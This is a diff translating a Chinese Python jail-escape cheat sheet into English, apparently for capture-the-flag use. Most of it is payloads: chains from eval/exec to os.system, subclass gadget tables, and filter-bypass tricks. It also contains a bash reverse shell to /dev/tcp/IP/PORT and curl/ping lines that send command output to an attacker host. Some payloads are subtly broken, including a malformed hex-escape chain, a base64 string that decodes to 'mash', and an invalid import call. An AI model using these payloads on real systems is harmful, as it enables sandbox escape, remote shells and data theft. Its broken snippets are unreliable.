@@ -1,28 +1,28 @@
-# Python Jail 逃逸大全
+# Python Jail Escape Compendium
 
-## 逃逸决策树
+## Escape Decision Tree
 
 ```
-输入被 eval/exec
-├── 能否 import?
-│   ├── 能 → __import__('os').system('id')
-│   └── 不能 → 找 builtins
-├── 能否访问 __builtins__?
-│   ├── 能 → 利用 __builtins__ 找可用函数
-│   └── 不能 → 找其他引用链
-├── 是否有过滤?
-│   ├── 过滤下划线 → 找无下划线函数
-│   ├── 过滤引号 → 用 StringIO/chr()
-│   └── 过滤方括号 → 用 .format() 或 getattr
-└── 字符限制?
-    ├── 只有字母 → 用 chr() 构造任意字符
-    ├── 长度限制 → 短 payload
-    └── 只允许数字 → 复杂编码
+Input is passed to eval/exec
+├── Can you import?
+│   ├── Yes → __import__('os').system('id')
+│   └── No → find builtins
+├── Can you access __builtins__?
+│   ├── Yes → use __builtins__ to find usable functions
+│   └── No → find another reference chain
+├── Is there filtering?
+│   ├── Underscore filtered → find functions without underscores
+│   ├── Quotes filtered → use StringIO/chr()
+│   └── Square brackets filtered → use .format() or getattr
+└── Character restrictions?
+    ├── Letters only → use chr() to construct arbitrary characters
+    ├── Length limit → short payload
+    └── Digits only → complex encoding
 ```
 
-## 基础逃逸链
+## Basic Escape Chains
 
-### 1. 直接执行命令
+### 1. Directly Execute Commands
 ```python
 __import__('os').system('id')
 __import__('os').popen('id').read()
@@ -30,100 +30,100 @@ eval("__import__('os').system('id')")
 exec("__import__('os').system('id')")
 ```
 
-### 2. 通过 builtins
+### 2. Via builtins
 ```python
 __builtins__.__dict__['__import__']('os').system('id')
 getattr(getattr(__builtins__, '__im' + 'port__'), 'os').system('id')
 ```
 
-### 3. 通过 func_globals
+### 3. Via func_globals
 ```python
 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('id')
 ```
 
-### 4. 通过 type()
+### 4. Via type()
 ```python
 type(type(os))
 (type.__subclasses__())
 ```
 
-### 5. 通过 Warning/Exception
+### 5. Via Warning/Exception
 ```python
 ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')")
 ```
 
-## 常见子类索引 (print 找索引)
+## Common Subclass Indexes (use print to find index)
 
 ```python
-# 列出所有可用子类
+# List all available subclasses
 print([c.__name__ for c in __builtins__.__dict__.values() if type(c).__name__ == 'type'])
 
-# 或遍历找特定类
+# Or iterate to find a specific class
 for i, c in enumerate([].__class__.__base__.__subclasses__()):
     print(i, c.__name__)
 ```
 
-## 常用 Gadgets
+## Common Gadgets
 
-| 类名 | 索引 | 用途 |
+| Class name | Index | Purpose |
 |------|------|------|
-| `catch_warnings` | ~59 | 获取 `__builtins__` |
-| `_io._IOBase` | ~80 | 文件操作 |
-| `Popen` | ~200+ | 命令执行 |
-| `subprocess.Popen` | 动态 | 命令执行 |
+| `catch_warnings` | ~59 | Obtain `__builtins__` |
+| `_io._IOBase` | ~80 | File operations |
+| `Popen` | ~200+ | Command execution |
+| `subprocess.Popen` | dynamic | Command execution |
 
-## 绕过过滤
+## Bypassing Filters
 
-### 下划线被过滤
+### Underscore filtered
 ```python
 getattr(getattr(__builtins__, '\x5f\x5fclass\x5f\x5f'), '\x5f\x5f\x5fimport\x5f\x5f')('os').system('id')
 
-# 或用 request 对象（Flask）
+# Or use the request object (Flask)
 request.environ['werkzeug.server.shutdown']
 ```
 
-### 引号被过滤
+### Quotes filtered
 ```python
 chr(95)*2  # '__'
-# 或用 StringIO
+# Or use StringIO
 import('so'[::-1], fromlist=['os']).system('id')
 ```
 
-### 方括号被过滤
+### Square brackets filtered
 ```python
 getattr(__import__('os'), 'system')('id')
-# 用 .__getattribute__ 代替 getattr
+# Use .__getattribute__ instead of getattr
 ```
 
-### 数字被过滤
+### Digits filtered
 ```python
-# 用 True/False 构造数字
+# Construct numbers using True/False
 True.__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']
 # True = 1, False = 0
 ```
 
-### 长度限制
+### Length limit
 ```python
-# 最短的反弹 shell
+# Shortest reverse shell
 __import__('os').system('bash -i >& /dev/tcp/IP/PORT 0>&1')
 
-# 或 base64 解码执行
+# Or decode and execute base64
 __import__('base64').b64decode('bWFzaCAtaSA+JiAvZGV2L3RjcC9JUC9QT1JUIDAmPnxkZXYvdGNwL0lQL1BPUlQK').decode()
 ```
 
-## 常见过滤绕过字符集
+## Common Filter-Bypass Character Sets
 
-| 绕过方法 | 适用字符 |
+| Bypass method | Applicable characters |
 |---------|---------|
-| `chr()` | 所有可见字符 |
-| `hex()` / `oct()` | 数字构造 |
-| `[::-1]` 反转 | `so"[::-1]` = `os` |
-| `+` 拼接 | `'os'[0]+'stem'` |
-| 变量赋值 | `c='o'+'s';__import__(c)` |
+| `chr()` | All printable characters |
+| `hex()` / `oct()` | Number construction |
+| `[::-1]` reversal | `so"[::-1]` = `os` |
+| `+` concatenation | `'os'[0]+'stem'` |
+| Variable assignment | `c='o'+'s';__import__(c)` |
 
-## 无回显检测
+## Blind (No-Output) Detection
 ```python
-# 如果命令执行无回显，用以下方式验证
+# If command execution produces no output, verify using the following
 __import__('os').system('curl http://attacker/?$(id)')
 __import__('os').system('ping -c1 attacker.com')
 ```
